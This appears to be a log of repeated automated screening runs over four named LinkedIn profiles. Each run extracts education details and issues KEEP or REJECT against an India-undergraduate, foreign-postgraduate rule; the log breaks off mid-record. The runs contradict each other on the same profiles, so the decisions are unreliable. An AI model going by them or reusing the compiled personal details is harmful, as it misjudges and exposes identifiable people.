+
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Manvi Mishra
+
+UG_DEGREE: B Tech CSE
+
+UG_INSTITUTION: Banasthali Vidyapith
+
+UG_COUNTRY: India
+
+PG_DEGREE: Not Found
+
+PG_INSTITUTION: Not Found
+
+PG_COUNTRY: Unknown
+
+UG_EVIDENCE: "second year student at Banasthali Vidyapith" and "B Tech CSE’28" in the headline and about section.
+
+PG_EVIDENCE: None found. The profile owner is currently an undergraduate student (expecting to graduate in 2028).
+
+REASON:
+The profile owner is currently an undergraduate student and does not have any postgraduate education listed.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/ritesh-pandey-aa7a82129/
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Ritesh Pandey
+
+UG_DEGREE: Not Found
+
+UG_INSTITUTION: Not Found
+
+UG_COUNTRY: Unknown
+
+PG_DEGREE: Not Found
+
+PG_INSTITUTION: Not Found
+
+PG_COUNTRY: Unknown
+
+UG_EVIDENCE: None
+
+PG_EVIDENCE: None
+
+REASON:
+The profile lacks an explicit education section. While "Welingkar Institute of Management" (an Indian institution) is mentioned in the header, there is no evidence of any completed undergraduate or postgraduate degrees, nor is there any evidence of a foreign postgraduate degree. The foreign universities mentioned (University of South Florida, Roger Williams University) are his employers, not institutions where he studied.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/anushwar
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Anushwar Sharma
+
+UG_DEGREE: Not Found
+
+UG_INSTITUTION: Not Found
+
+UG_COUNTRY: Unknown
+
+PG_DEGREE: Master's in Computer Engineering
+
+PG_INSTITUTION: Arizona State University
+
+PG_COUNTRY: USA
+
+UG_EVIDENCE: Not Found
+
+PG_EVIDENCE: "I graduated with my Master’s in Computer Engineering from Arizona State University."
+
+REASON:
+No undergraduate education is mentioned in the profile, so the requirement of having an undergraduate degree from India cannot be verified.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Manvi Mishra
+
+UG_DEGREE: Bachelor of Technology - BTech, Computer Science
+
+UG_INSTITUTION: Banasthali Vidyapith
+
+UG_COUNTRY: India
+
+PG_DEGREE: Not Found
+
+PG_INSTITUTION: Not Found
+
+PG_COUNTRY: Unknown
+
+UG_EVIDENCE: Banasthali Vidyapith, Bachelor of Technology - BTech, Computer Science (2024 – 2028)
+
+PG_EVIDENCE: No PG education is mentioned in the profile.
+
+REASON:
+No postgraduate education was found on the profile.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/ritesh-pandey-aa7a82129/
+================================================================================
+
+DECISION:
+REJECT
+
+NAME:
+Ritesh Pandey
+
+UG_DEGREE: Bachelor of Science - BS
+
+UG_INSTITUTION: University of Mumbai
+
+UG_COUNTRY: India
+
+PG_DEGREE: Postgraduate Degree
+
+PG_INSTITUTION: Welingkar Institute of Management
+
+PG_COUNTRY: India
+
+UG_EVIDENCE: University of Mumbai, Bachelor of Science - BS, Information Technology, Jun 2009 – May 2012
+
+PG_EVIDENCE: Welingkar Institute of Management, Postgraduate Degree, Marketing/Marketing Management, General, Jul 2015 – May 2017
+
+REASON:
+Both the undergraduate and postgraduate educations are from institutions located in India.
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/anushwar/
+================================================================================
+
+DECISION:
+KEEP
+
+NAME:
+Anushwar
+
+UG_DEGREE: Bachelor of Engineering - BE, Computer Science
+
+UG_INSTITUTION: Visvesvaraya Technological University
+
+UG_COUNTRY: India
+
+PG_DEGREE: Master of Science - MS, Computer Engineering (Computer Systems)
+
+PG_INSTITUTION: Arizona State University
+
+PG_COUNTRY: USA
+
+UG_EVIDENCE: Visvesvaraya Technological University, Bachelor of Engineering - BE, Computer Science
+
+PG_EVIDENCE: Arizona State University, Master of Science - MS, Computer Engineering (Computer Systems)
+
+REASON:
+The profile owner's undergraduate education is from India (Visvesvaraya Technological University) and postgraduate education is from outside India (Arizona State University in the USA).
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 4
+URL: https://www.linkedin.com/in/nikhileshgunnam/
+================================================================================
+
+DECISION:
+KEEP
+
+NAME:
+Nikhilesh Gunnam
+
+UG_DEGREE: Bachelor of Technology - BTech, Computer Science
+
+UG_INSTITUTION: Vellore Institute of Technology
+
+UG_COUNTRY: India
+
+PG_DEGREE: Master of Science - MS
+
+PG_INSTITUTION: Syracuse University College of Engineering and Computer Science
+
+PG_COUNTRY: USA
+
+UG_EVIDENCE: Vellore Institute of Technology, Bachelor of Technology - BTech, Computer Science (2019 – 2023)
+
+PG_EVIDENCE: Syracuse University College of Engineering and Computer Science, Master of Science - MS (Sep 2023 – May 2025)
+
+REASON: The profile owner's undergraduate education is from India (Vellore Institute of Technology) and postgraduate education is from outside India (Syracuse University in the USA).
+
+CONFIDENCE:
+HIGH
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Name:** Manvi Mishra
+
+**STEP 2 — FIND THE PERSON'S EDUCATION**
+* **Banasthali Vidyapith:** Bachelor of Technology (BTech), Computer Science (2024 – 2028)
+* **Little Flower School, Gorakhpur:** HighSchool
+
+**STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Technology - BTech, Computer Science
+* **UG_INSTITUTION:** Banasthali Vidyapith
+* **UG_LOCATION:** Rajasthan
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Listed in the education section as a Bachelor of Technology degree from Banasthali Vidyapith (2024 – 2028).
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Not Found
+* **PG_INSTITUTION:** Not Found
+* **PG_LOCATION:** Not Found
+* **PG_COUNTRY:** Not Found
+* **PG_EVIDENCE:** No postgraduate degree is mentioned in the profile. The profile owner is currently an undergraduate student (expected graduation 2028).
+* **PG_START_YEAR:** Not Applicable
+* **PG_END_YEAR:** Not Applicable
+
+**STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES**
+* No other universities are mentioned in the text.
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+
+* **UG in India:** Yes (Banasthali Vidyapith)
+* **PG outside India:** No (No PG education found)
+* **PG start year (2024 - Present):** No (No PG education found)
+
+**Result:** REJECT
+
+**Reason:** The profile owner's undergraduate education is in India, but there is no postgraduate education (inside or outside India) indicated in the profile.
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/ritesh-pandey-aa7a82129/
+================================================================================
+
+Based on the raw LinkedIn profile text provided, here is the step-by-step analysis and final decision:
+
+### STEP 1 — IDENTIFY THE PROFILE OWNER
+* **Name:** Ritesh Pandey
+
+---
+
+### STEP 2 — FIND THE PERSON'S EDUCATION
+* **Education found:** 
+  1. Bachelor of Science - BS (Information Technology) from University of Mumbai (Jun 2009 – May 2012)
+  2. Postgraduate Degree (Marketing/Marketing Management, General) from Welingkar Institute of Management (Jul 2015 – May 2017)
+
+---
+
+### STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION
+* **UG_DEGREE:** Bachelor of Science - BS, Information Technology
+* **UG_INSTITUTION:** University of Mumbai
+* **UG_LOCATION:** Mumbai, Maharashtra
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** University of Mumbai is a prominent and recognized public state university located in Mumbai, India.
+* **UG in India?** Yes
+
+---
+
+### STEP 4 — IDENTIFY POSTGRADUATE EDUCATION
+* **PG_DEGREE:** Postgraduate Degree, Marketing/Marketing Management, General
+* **PG_INSTITUTION:** Welingkar Institute of Management (WeSchool)
+* **PG_LOCATION:** Mumbai/Bengaluru
+* **PG_COUNTRY:** India
+* **PG_EVIDENCE:** Welingkar Institute of Management is a well-known business school with campuses in Mumbai and Bengaluru, India.
+* **PG outside India?** No
+* **PG_START_YEAR:** 2015
+* **PG_END_YEAR:** 2017
+
+---
+
+### STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES
+* No other universities or external academic organizations were mentioned in the profile text.
+
+---
+
+### STEP 6 — DETERMINE THE FINAL RESULT
+
+* **Condition A (UG in India):** Satisfied (University of Mumbai, India)
+* **Condition B (PG outside India):** **NOT Satisfied** (Welingkar Institute of Management is in India)
+* **Condition C (PG starts 2024 or later):** **NOT Satisfied** (The postgraduate degree started in 2015)
+
+**Result:** **REJECT**
+
+**Reason:** The postgraduate education is from an Indian institution (Welingkar Institute of Management) and it started in 2015, which does not meet the requirement of being outside India and starting in 2024 or later.
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/anushwar/
+================================================================================
+
+### STEP 1 — IDENTIFY THE PROFILE OWNER
+The profile owner is **Anushwar** (based on the LinkedIn URL profile handle).
+
+---
+
+### STEP 2 — FIND THE PERSON'S EDUCATION
+The profile lists the following education details:
+* Master of Science - MS, Computer Engineering (Computer Systems) from Arizona State University.
+* Bachelor of Engineering - BE, Computer Science from Visvesvaraya Technological University.
+
+---
+
+### STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION
+* **UG_DEGREE:** Bachelor of Engineering - BE, Computer Science
+* **UG_INSTITUTION:** Visvesvaraya Technological University
+* **UG_LOCATION:** Karnataka
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Visvesvaraya Technological University is a well-known public state university in Karnataka, India.
+
+---
+
+### STEP 4 — IDENTIFY POSTGRADUATE EDUCATION
+* **PG_DEGREE:** Master of Science - MS, Computer Engineering (Computer Systems)
+* **PG_INSTITUTION:** Arizona State University
+* **PG_LOCATION:** Tempe, Arizona
+* **PG_COUNTRY:** USA
+* **PG_EVIDENCE:** The profile lists "Arizona State University" under the education section for a Master of Science - MS degree.
+* **PG_START_YEAR:** Unknown (no years are listed in the raw text for this degree)
+* **PG_END_YEAR:** Unknown
+
+---
+
+### STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES
+The listed universities (Arizona State University and Visvesvaraya Technological University) are explicitly listed under the owner's education section.
+
+---
+
+### STEP 6 — DETERMINE THE FINAL RESULT
+
+**DECISION:** **REJECT**
+
+**Reason:** 
+While the undergraduate education is from India and the postgraduate education is from outside India (USA), there are no dates or years specified in the raw profile text for the postgraduate degree. Because the PG start year cannot be established confidently as 2024 or later, the profile must be rejected under the PG Year Rule.
+
+
+================================================================================
+PROFILE 4
+URL: https://www.linkedin.com/in/nikhileshgunnam/
+================================================================================
+
+Based on the analysis of the provided LinkedIn profile, here is the step-by-step evaluation:
+
+### **STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Name:** Nikhilesh Gunnam
+
+### **STEP 2 & 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG Degree:** Bachelor of Technology - BTech, Computer Science
+* **UG Institution:** Vellore Institute of Technology
+* **UG Location/Country:** India
+* **UG Dates:** 2019 – 2023
+* **UG in India:** **YES**
+
+### **STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG Degree:** Master of Science - MS
+* **PG Institution:** Syracuse University College of Engineering and Computer Science
+* **PG Location/Country:** USA (Outside India)
+* **PG Start Year:** 2023
+* **PG End Year:** 2025
+* **PG Outside India:** **YES**
+
+### **STEP 6 — DETERMINE THE FINAL RESULT**
+To **KEEP** the profile, the PG education must have started in **2024 or later**. 
+
+* The profile owner's postgraduate program at Syracuse University started in **September 2023**.
+* According to the PG Year Rule: *"PG starting before 2024 must be REJECTED."*
+
+---
+
+### **FINAL DECISION**
+**REJECT**
+
+**Reason:** Although the undergraduate education is in India and the postgraduate education is outside India, the postgraduate program started in 2023 (before the required 2024–present window).
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Name:** Manvi Mishra
+
+**STEP 2 — FIND THE PERSON'S EDUCATION**
+* **Undergraduate Degree:** Bachelor of Technology (BTech) in Computer Science from Banasthali Vidyapith (2024 – 2028).
+* **Postgraduate Degree:** None found in the profile.
+
+**STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Technology - BTech, Computer Science
+* **UG_INSTITUTION:** Banasthali Vidyapith
+* **UG_LOCATION:** Rajasthan, India
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Profile lists "Banasthali Vidyapith", a well-known university located in Rajasthan, India, for a BTech degree from 2024 to 2028.
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Not Found
+* **PG_INSTITUTION:** Not Found
+* **PG_LOCATION:** Not Found
+* **PG_COUNTRY:** Not Found
+* **PG_EVIDENCE:** None
+* **PG_START_YEAR:** Unknown
+* **PG_END_YEAR:** Unknown
+
+**STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES**
+* No external or non-belonging universities are mentioned.
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+
+* **Result:** REJECT
+* **Reason:** The profile owner's undergraduate education is from India, but there is no postgraduate education (inside or outside India) listed in the profile.
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/ritesh-pandey-aa7a82129/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Name:** Ritesh Pandey
+
+**STEP 2 — FIND THE PERSON'S EDUCATION**
+* **Welingkar Institute of Management:** Postgraduate Degree, Marketing/Marketing Management, General (Jul 2015 – May 2017)
+* **University of Mumbai:** Bachelor of Science - BS, Information Technology (Jun 2009 – May 2012)
+
+**STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Science - BS, Information Technology
+* **UG_INSTITUTION:** University of Mumbai
+* **UG_LOCATION:** Mumbai, Maharashtra
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** University of Mumbai is a prominent public state university located in Mumbai, India.
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Postgraduate Degree, Marketing/Marketing Management, General
+* **PG_INSTITUTION:** Welingkar Institute of Management (WeSchool)
+* **PG_LOCATION:** Mumbai/Bengaluru
+* **PG_COUNTRY:** India
+* **PG_EVIDENCE:** Welingkar Institute of Management is an Indian business school. 
+* **PG_START_YEAR:** 2015
+* **PG_END_YEAR:** 2017
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+
+**Result:** REJECT
+
+**Reason:** 
+1. The postgraduate education is from an institution in India (Welingkar Institute of Management), not outside India.
+2. The postgraduate program took place from 2015 to 2017, which does not overlap with the required 2024–present (2026) period.
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/anushwar/
+================================================================================
+
+Based on the analysis of the provided raw LinkedIn profile, here is the evaluation:
+
+### STEP 1 — IDENTIFY THE PROFILE OWNER
+* **Name:** Anushwar (inferred from URL)
+
+### STEP 2 — FIND THE PERSON'S EDUCATION
+* **Undergraduate (UG):** Bachelor of Engineering - BE, Computer Science at Visvesvaraya Technological University
+* **Postgraduate (PG):** Master of Science - MS, Computer Engineering (Computer Systems) at Arizona State University
+
+### STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION
+* **UG_DEGREE:** Bachelor of Engineering - BE, Computer Science
+* **UG_INSTITUTION:** Visvesvaraya Technological University
+* **UG_LOCATION:** Karnataka, India
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Visvesvaraya Technological University (VTU) is a well-known public state university in India.
+
+### STEP 4 — IDENTIFY POSTGRADUATE EDUCATION
+* **PG_DEGREE:** Master of Science - MS, Computer Engineering (Computer Systems)
+* **PG_INSTITUTION:** Arizona State University
+* **PG_LOCATION:** Tempe, Arizona, USA
+* **PG_COUNTRY:** USA (Outside India)
+* **PG_EVIDENCE:** Arizona State University is a recognized university located in the United States.
+* **PG_START_YEAR:** Unknown
+* **PG_END_YEAR:** Unknown
+
+### STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES
+* No external/unrelated universities were incorrectly identified.
+
+### STEP 6 — DETERMINE THE FINAL RESULT
+
+**DECISION:** REJECT
+
+**Reason:** 
+Although the profile owner has an undergraduate degree from India and a postgraduate degree from outside India, there are **no dates or years** provided for the postgraduate education in the profile text. Therefore, it is impossible to determine whether the PG education overlaps with the required 2024–present (2026) period. According to the rules, profiles with unknown/unclear PG dates must be rejected.
+
+
+================================================================================
+PROFILE 4
+URL: https://www.linkedin.com/in/nikhileshgunnam/
+================================================================================
+
+Based on the raw LinkedIn profile text provided, here is the step-by-step analysis:
+
+### STEP 1 — IDENTIFY THE PROFILE OWNER
+* **Name:** Nikhilesh Gunnam
+
+### STEP 2 — FIND THE PERSON'S EDUCATION
+* Undergrad and Postgrad educations are both clearly listed under the Education section of the profile owner.
+
+### STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION
+* **UG_DEGREE:** Bachelor of Technology - BTech, Computer Science
+* **UG_INSTITUTION:** Vellore Institute of Technology
+* **UG_LOCATION/COUNTRY:** India
+* **UG_EVIDENCE:** Listed under the Education section: "Vellore Institute of Technology", "Bachelor of Technology - BTech, Computer Science", "2019 – 2023"
+* **Is UG from India?** Yes
+
+### STEP 4 — IDENTIFY POSTGRADUATE EDUCATION
+* **PG_DEGREE:** Master of Science - MS
+* **PG_INSTITUTION:** Syracuse University College of Engineering and Computer Science
+* **PG_LOCATION/COUNTRY:** USA (Outside India)
+* **PG_START_YEAR:** 2023 (September)
+* **PG_END_YEAR:** 2025 (May)
+* **PG_EVIDENCE:** Listed under the Education section: "Syracuse University College of Engineering and Computer Science", "Master of Science - MS", "Sep 2023 – May 2025"
+* **Is PG from outside India?** Yes
+
+### STEP 5 — DISTINGUISH EDUCATION
+* The listed educations are directly and clearly attributed to the profile owner under the Education section.
+
+### STEP 6 — DETERMINE THE FINAL RESULT
+* **UG is from India?** Yes (Vellore Institute of Technology)
+* **PG is from outside India?** Yes (Syracuse University, USA)
+* **PG overlaps 2024–Present (2026)?** Yes (The program ran from September 2023 to May 2025, which overlaps with the 2024–present timeframe).
+
+**RESULT:** **KEEP**
+
+**Reason:** The profile owner completed their undergraduate degree in India, is pursuing/completed a postgraduate Master's degree in the United States, and the postgraduate program overlaps with the required 2024–present timeframe (ending in 2025).
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Name:** Manvi Mishra
+
+**STEP 2 — FIND THE PERSON'S EDUCATION**
+* BTech, Computer Science at Banasthali Vidyapith (2024 - 2028)
+* HighSchool at Little Flower School, Gorakhpur
+
+**STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Technology - BTech, Computer Science
+* **UG_INSTITUTION:** Banasthali Vidyapith
+* **UG_LOCATION:** Rajasthan
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Under "Education" section: "Banasthali Vidyapith", "Bachelor of Technology - BTech, Computer Science", "2024 – 2028".
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Not Found
+* **PG_INSTITUTION:** N/A
+* **PG_LOCATION:** N/A
+* **PG_COUNTRY:** N/A
+* **PG_START_YEAR:** N/A
+* **PG_END_YEAR:** N/A
+* **PG_EVIDENCE:** No postgraduate education is mentioned in the profile.
+
+**STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES**
+* No other universities are mentioned in the provided text.
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+* **Decision:** REJECT
+* **Reason:** No postgraduate education is supported by the profile.
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/ritesh-pandey-aa7a82129/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+
+Name: Ritesh Pandey
+
+**STEP 2 — FIND THE PERSON'S EDUCATION**
+
+* **University of Mumbai**: Bachelor of Science - BS, Information Technology (2009 – 2012)
+* **Welingkar Institute of Management**: Postgraduate Degree, Marketing/Marketing Management, General (2015 – 2017)
+
+**STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+
+* **UG_DEGREE:** Bachelor of Science - BS, Information Technology
+* **UG_INSTITUTION:** University of Mumbai
+* **UG_LOCATION:** Mumbai
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** The profile lists "University of Mumbai, Bachelor of Science - BS, Information Technology, Jun 2009 – May 2012."
+
+Is UG in India? **Yes**
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+
+* **PG_DEGREE:** Postgraduate Degree, Marketing/Marketing Management, General
+* **PG_INSTITUTION:** Welingkar Institute of Management (WeSchool)
+* **PG_LOCATION:** Mumbai/Bengaluru
+* **PG_COUNTRY:** India
+* **PG_EVIDENCE:** The profile lists "Welingkar Institute of Management, Postgraduate Degree, Marketing/Marketing Management, General, Jul 2015 – May 2017."
+* **PG_START_YEAR:** 2015
+* **PG_END_YEAR:** 2017
+
+Is PG outside India? **No** (Welingkar Institute of Management is an Indian business school)
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+
+**Result:** REJECT
+
+**Reason:** The postgraduate education is from an institution in India, not outside India. Additionally, the postgraduate program occurred from 2015 to 2017, which does not overlap with the required 2024-present period.
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/anushwar/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Name:** Anushwar (identified from URL: `https://www.linkedin.com/in/anushwar/`)
+
+**STEP 2 & 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Engineering - BE, Computer Science
+* **UG_INSTITUTION:** Visvesvaraya Technological University
+* **UG_LOCATION:** Karnataka
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Listed under the "Education" section. Visvesvaraya Technological University is a well-known public state university in India.
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Master of Science - MS, Computer Engineering (Computer Systems)
+* **PG_INSTITUTION:** Arizona State University
+* **PG_LOCATION:** Tempe, Arizona
+* **PG_COUNTRY:** United States (Outside India)
+* **PG_START_YEAR:** Unknown
+* **PG_END_YEAR:** Unknown
+* **PG_EVIDENCE:** Listed under the "Education" section. No years/dates are provided for this program in the raw text.
+
+**STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES**
+* The universities listed under the education section clearly belong to the profile owner.
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+
+* **UG in India?** Yes (Visvesvaraya Technological University)
+* **PG outside India?** Yes (Arizona State University, USA)
+* **PG overlaps 2024-present?** No (The dates for the postgraduate program are missing/unknown).
+
+According to the rules: "UG India + PG Foreign + PG dates unknown/unclear = REJECT".
+
+**FINAL DECISION:**
+**REJECT**
+
+**Reason:**
+Although the undergraduate education is from India and the postgraduate education is from outside India, the profile does not provide any dates for the postgraduate program. Thus, it is impossible to verify if the postgraduate education overlaps with the required 2024–present period.
+
+
+================================================================================
+PROFILE 4
+URL: https://www.linkedin.com/in/nikhileshgunnam/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Name:** Nikhilesh Gunnam
+
+**STEP 2 — FIND THE PERSON'S EDUCATION**
+* Master of Science - MS at Syracuse University College of Engineering and Computer Science (Sep 2023 – May 2025)
+* Bachelor of Technology - BTech, Computer Science at Vellore Institute of Technology (2019 – 2023)
+
+**STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Technology - BTech, Computer Science
+* **UG_INSTITUTION:** Vellore Institute of Technology
+* **UG_LOCATION:** Vellore, Tamil Nadu
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Profile lists "Vellore Institute of Technology, Bachelor of Technology - BTech, Computer Science, 2019 – 2023", which is a well-known university in India.
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Master of Science - MS
+* **PG_INSTITUTION:** Syracuse University College of Engineering and Computer Science
+* **PG_LOCATION:** Syracuse, New York
+* **PG_COUNTRY:** United States (USA)
+* **PG_START_YEAR:** 2023
+* **PG_END_YEAR:** 2025
+* **PG_EVIDENCE:** Profile lists "Syracuse University College of Engineering and Computer Science, Master of Science - MS, Sep 2023 – May 2025". Syracuse University is located in the USA.
+
+**STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES**
+* No other universities are mentioned in the raw text.
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+* **UG is from India:** Yes (Vellore Institute of Technology)
+* **PG is from OUTSIDE India:** Yes (Syracuse University, USA)
+* **PG overlaps with 2024–2026:** Yes (The program ran from September 2023 to May 2025, which overlaps with the year 2024 and 2025).
+
+**FINAL DECISION:**
+**KEEP**
+
+**Reason:** 
+The profile owner completed their undergraduate degree in India at Vellore Institute of Technology (2019–2023) and pursued their postgraduate degree outside India at Syracuse University (Sep 2023–May 2025). The postgraduate education successfully overlaps with the 2024–present timeline.
+
+
+================================================================================
+PROFILE 1
+URL: https://www.linkedin.com/in/manvi-mishra-3b6326343/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Name:** Manvi Mishra
+
+**STEP 2 — FIND THE PERSON'S EDUCATION**
+* **Undergraduate (UG):** Bachelor of Technology - BTech, Computer Science from Banasthali Vidyapith (2024 – 2028).
+* **Postgraduate (PG):** Not Found.
+
+**STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Technology - BTech, Computer Science
+* **UG_INSTITUTION:** Banasthali Vidyapith
+* **UG_LOCATION:** Rajasthan
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Profile states: "Banasthali Vidyapith, Bachelor of Technology - BTech, Computer Science, 2024 – 2028"
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Not Found
+* **PG_INSTITUTION:** Not Found
+* **PG_LOCATION:** Not Found
+* **PG_COUNTRY:** Not Found
+* **PG_START_YEAR:** Unknown
+* **PG_END_YEAR:** Unknown
+* **PG_EVIDENCE:** No postgraduate degree is mentioned in the profile.
+
+**STEP 5 — DISTINGUISH THE PERSON'S EDUCATION**
+* No external universities are mentioned in the text that require filtering out.
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+
+* **Result:** REJECT
+* **Reason:** No foreign postgraduate (PG) education is supported by the profile.
+
+
+================================================================================
+PROFILE 2
+URL: https://www.linkedin.com/in/ritesh-pandey-aa7a82129/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Profile Owner:** Ritesh Pandey
+
+**STEP 2 — FIND THE PERSON'S EDUCATION**
+* **University of Mumbai**: Bachelor of Science - BS, Information Technology (Jun 2009 – May 2012)
+* **Welingkar Institute of Management**: Postgraduate Degree, Marketing/Marketing Management, General (Jul 2015 – May 2017)
+
+**STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Science - BS, Information Technology
+* **UG_INSTITUTION:** University of Mumbai
+* **UG_LOCATION:** Mumbai, Maharashtra
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** University of Mumbai, Jun 2009 – May 2012
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Postgraduate Degree, Marketing/Marketing Management, General
+* **PG_INSTITUTION:** Welingkar Institute of Management
+* **PG_LOCATION:** Mumbai/Bengaluru
+* **PG_COUNTRY:** India
+* **PG_START_YEAR:** 2015
+* **PG_END_YEAR:** 2017
+* **PG_EVIDENCE:** Welingkar Institute of Management, Jul 2015 – May 2017
+
+**STEP 5 — DISTINGUISH THE PERSON'S EDUCATION FROM OTHER UNIVERSITIES**
+* No other universities are mentioned in the profile text.
+
+**STEP 6 — DETERMINE THE FINAL RESULT**
+
+* **UG India:** Yes (University of Mumbai)
+* **PG Foreign:** No (Welingkar Institute of Management is located in India)
+* **PG Overlaps 2024-Present:** No (Ended in 2017)
+
+**Result:** REJECT
+
+**Reason:** The profile owner's postgraduate education was completed in India and does not meet the requirement of being from outside India, nor does it overlap with the 2024-present period.
+
+
+================================================================================
+PROFILE 3
+URL: https://www.linkedin.com/in/anushwar/
+================================================================================
+
+**STEP 1 — IDENTIFY THE PROFILE OWNER**
+* **Profile Owner:** Anushwar
+
+**STEP 2 — FIND THE PERSON'S EDUCATION**
+* **Undergraduate (UG) Degree:** Bachelor of Engineering - BE, Computer Science (Visvesvaraya Technological University)
+* **Postgraduate (PG) Degree:** Master of Science - MS, Computer Engineering (Computer Systems) (Arizona State University)
+
+**STEP 3 — IDENTIFY UNDERGRADUATE EDUCATION**
+* **UG_DEGREE:** Bachelor of Engineering - BE, Computer Science
+* **UG_INSTITUTION:** Visvesvaraya Technological University
+* **UG_LOCATION:** Karnataka, India
+* **UG_COUNTRY:** India
+* **UG_EVIDENCE:** Visvesvaraya Technological University is a recognized public state university in Karnataka, India.
+
+**STEP 4 — IDENTIFY POSTGRADUATE EDUCATION**
+* **PG_DEGREE:** Master of Science - MS, Computer Engineering (Computer Systems)
